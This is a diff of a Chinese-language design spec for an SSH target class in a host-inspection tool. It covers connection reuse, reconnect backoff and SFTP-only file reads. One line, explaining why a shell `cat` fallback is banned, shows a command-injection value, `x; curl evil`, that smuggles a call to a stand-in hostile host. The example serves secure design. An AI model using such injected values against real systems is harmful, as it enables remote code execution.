@@ -9,8 +9,19 @@
 - **持有一个 per-target asyncssh control connection**：首次 `exec` 时按需建立 `asyncssh.connect(...)`；之后每次 `exec` 在该连接上**新建 channel**（通过 `conn.run(cmd, env=env)`，asyncssh 内部为每次 run 开 channel）—— **禁止**每次 exec 都重新 `asyncssh.connect`（对齐 docs/OPERABILITY.md §2.1 / §2.2 硬约束「不允许『每个 Inspector 重新 SSH 一次』—— 这是 M1 实施 SSH target 时必须 enforced 的硬约束」）
 - 连接管理用 `asyncio.Lock` 保护"是否已建连 + 是否需重连"状态机；channel 创建本身**无需**加锁（asyncssh 原生支持并行 channel）
 - `connect_timeout` 默认 10s，可在 `TargetEntry` 配置中按 target override
-- `ssh.idle_timeout_seconds` 默认 300s：control connection 空闲超过此值时自动 close；下次 exec 按需重连
-- 断线重连：检测到 `asyncssh.misc.ConnectionLost` / `ChannelOpenError` 等后，**1 次自动重连**，退避 1s → 4s → 16s（指数；严格对齐 docs/OPERABILITY.md §2.2「连接中断 → 1 次自动重连（指数退避 1s→4s→16s）」）；仍失败则 raise `TargetError(kind="ssh_connection_lost", target=name)`
+- `ssh.idle_timeout_seconds` 默认 300s：control connection 空闲超过此值时自动 close；下次 exec 按需重连。**该配置由 M0 `Settings.ssh.idle_timeout_seconds` 提供**（M1 通过 task 4.3a 扩展 Settings 加入 `ssh` 子 namespace；env var `HOSTLENS_SSH__IDLE_TIMEOUT_SECONDS` 可 override）；**不**放进 `TargetEntry` 字段集（M1 范围内 per-process 单值即可，per-target override 推到有用户需求时）
+- 断线重连：检测到 `asyncssh.misc.ConnectionLost` / `ChannelOpenError` 等后，启动重连流程。**精确算法**（避免"1 次重连"vs"3 段退避序列"的歧义）：
+  ```
+  for delay in [1.0, 4.0, 16.0]:        # 严格按 OPERABILITY §2.2 的退避序列
+      await asyncio.sleep(delay)
+      try:
+          self._conn = await asyncssh.connect(...)
+          return                         # 重连成功，结束
+      except (ConnectionLost, ChannelOpenError, OSError):
+          continue
+  raise TargetError(kind="ssh_connection_lost", target=self.name)
+  ```
+  这定义为 **"1 次自动重连尝试块（一组 3 段退避 + 3 次 connect 尝试）"**——OPERABILITY 措辞「1 次自动重连」指**一组**，不是"一次 connect"；总共最多 3 次 `asyncssh.connect` 调用 + 3 次 sleep（共 21s 上限）。验收测试见 task 5.3
 - asyncssh `keepalive_interval` 设为 60s（早发现死连接）；`agent_forwarding=False` + `x11_forwarding=False` 显式禁用（最小权限，对齐 OPERABILITY §2.2）
 - `capabilities` 初始值 `{Capability.SSH, Capability.SHELL, Capability.FILE_READ}`；运行时按需探测 `SYSTEMD` / `DOCKER_CLI`（首次 `exec` 后探测一次并缓存到 target 实例）
 - 析构（`__del__` / `aclose`）必须 close control connection；测试套不允许 `ResourceWarning: unclosed transport`
@@ -34,7 +45,7 @@
 
 - **当** control connection 因服务端 idle disconnect 抛出 `ConnectionLost`；调用 `await target.exec("echo hi", timeout=5)`
 - **那么** 实现必须自动重连**1 次**（退避 1s → 4s → 16s 序列；对齐 OPERABILITY §2.2）；首次重连成功后 exec 正常返回 ExecResult
-- **且** 若该 1 次重连仍失败（穷尽 16s 退避后仍 ConnectionLost），必须 raise `TargetError(kind="ssh_connection_lost", target=name)`（**不**raise asyncssh 原生异常）
+- **且** 若该 1 次重连块（3 段退避 + 3 次 connect 尝试）穷尽仍失败，必须 raise `TargetError(kind="ssh_connection_lost", target=name)`（**不**raise asyncssh 原生异常）
 
 #### 场景:SSHTarget 连接超时 raise TargetError
 
@@ -108,7 +119,7 @@
 `SSHTarget.read_file(path)` 必须：
 
 - 仅用 asyncssh SFTP（`async with conn.start_sftp_client() as sftp: ...`）
-- SFTP 不可用（远端禁用 sftp-server subsystem）时 raise `TargetError("sftp_unavailable", target=name)`；**禁止** fallback 到 `cat <path>` shell 命令（理由：`cat` fallback 含 (a) shell 命令注入风险——`path="x; curl evil"` 直接 RCE；(b) 二进制内容经 shell stdout 可能被截断或编码变换，破坏字节完整性；(c) 大文件无法在读到 10MB 时主动中断）
+- SFTP 不可用（远端禁用 sftp-server subsystem）时 raise `TargetError(kind="sftp_unavailable", target=name)`；**禁止** fallback 到 `cat <path>` shell 命令（理由：`cat` fallback 含 (a) shell 命令注入风险——`path="x; curl evil"` 直接 RCE；(b) 二进制内容经 shell stdout 可能被截断或编码变换，破坏字节完整性；(c) 大文件无法在读到 10MB 时主动中断）
 - 文件 ≥10 MB 时 raise `TargetError("file_too_large", path=path, size=size)`，**不**返回部分内容
 - 文件不存在 raise `FileNotFoundError`（标准库异常，不包装）
 - path 参数即使是合法 SFTP 路径，也必须经过 `pathlib.PurePosixPath` 校验（拒绝含 NUL 字节 / 换行 / 含 `..` 的相对路径）
